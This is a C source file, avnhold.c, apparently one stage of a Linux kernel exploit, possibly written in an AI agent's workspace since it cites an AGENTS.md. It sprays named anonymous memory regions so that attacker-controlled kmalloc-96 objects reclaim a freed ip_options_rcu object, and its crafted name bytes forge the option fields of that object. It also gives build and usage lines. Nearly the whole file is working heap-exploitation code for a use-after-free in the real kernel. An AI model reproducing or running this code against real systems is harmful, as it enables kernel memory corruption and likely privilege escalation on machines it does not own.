/* avnhold.c - HOLD variant of avnspray: reclaim the freed ip_options_rcu by
 * naming MANY distinct anonymous VMAs, so the anon_vma_name objects
 * (kmalloc-96, fully controlled content) accumulate and DRAIN the active slab
 * -> force SLUB to pull the victim's slab off the per-cpu partial list.
 *
 * Why a hold: on a stock boot the freed victim lands on the freeing CPU's
 * per-cpu partial list (slub fast path). A churn spray (alloc+free) keeps the
 * current active slab alive (LIFO) and never exhausts it, so it never touches
 * the victim's slab; the storm's own save_options (which holds reqs) drains
 * the active slab and reclaims. Only a spray that HOLDS objects (exhausts the
 * active slab) competes. See AGENTS.md 8e.
 *
 * anon_vma_name_alloc(): kmalloc(4 + strlen(name)+1) -> 84B for NAMELEN=79
 * (kmalloc-96). Object+4 = name[0], so object+16 = name[12] = faddr, etc.
 * Content must be printable ASCII (0x20..0x7e), no NUL, no \ ` $ [ ].
 *
 * Build: gcc -O2 -static -o avnhold avnhold.c
 * Usage: ./avnhold <runtime_s> [cpu] [nvma]
 *
 * nvma defaults to 60000 (near vm.max_map_count) so the spray keeps allocating
 * NEW names for the whole run instead of replacing a small fixed set: only a
 * growing hold drains the active slab and adopts the victim's partial slab.
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <time.h>
#include <unistd.h>

#ifndef PR_SET_VMA
#define PR_SET_VMA 0x53564d41
#endif
#define PR_SET_VMA_ANON_NAME 0

#define NAMELEN 79
#define STRIDE 8192          /* 4k vma + 4k guard so VMAs don't merge */
#define BASE   0x300000000UL

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    int nvma = argc > 3 ? atoi(argv[3]) : 60000;
    cpu_set_t s;
    CPU_ZERO(&s); CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    char name[NAMELEN + 1];
    memset(name, 'A', NAMELEN);
    name[NAMELEN] = 0;
    name[20] = 0x28;  /* optlen = 40   */
    name[21] = 67;    /* srr  = 'C'    */
    name[22] = 68;    /* rr   = 'D'    */
    name[23] = 69;    /* ts   = 'E'    */
    name[24] = 0x28;  /* flags: rr_needaddr(8) | ts_needaddr(0x20) */
    name[12] = 32; name[13] = 32; name[14] = 32; name[15] = 32;  /* faddr 32.32.32.32 */
    name[28] = 0x44;  /* __data: printable TS option */
    name[29] = 0x28;
    name[30] = 0x25;
    name[31] = 0x20;
    name[35] = 0x41; name[36] = 0x42; name[37] = 0x43; name[38] = 0x44;  /* s1 0x44434241 */
    name[43] = 0x45; name[44] = 0x46; name[45] = 0x47; name[46] = 0x48;  /* s3 0x48474645 */

    /* pre-fault one page to warm the path */
    unsigned long i = 0;
    unsigned long named = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        unsigned long addr = BASE + (i % (unsigned long)nvma) * STRIDE;
        /* create a fresh distinct VMA and name it (held object) */
        void *p = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        if (p == MAP_FAILED) { i++; continue; }
        *(volatile char *)p = 0x20;
        if (prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME,
                  addr, 4096UL, (unsigned long)name) == 0)
            named++;
        i++;
    }
    fprintf(stderr, "[avnhold] named=%lu nvma=%d\n", named, nvma);
    return 0;
}
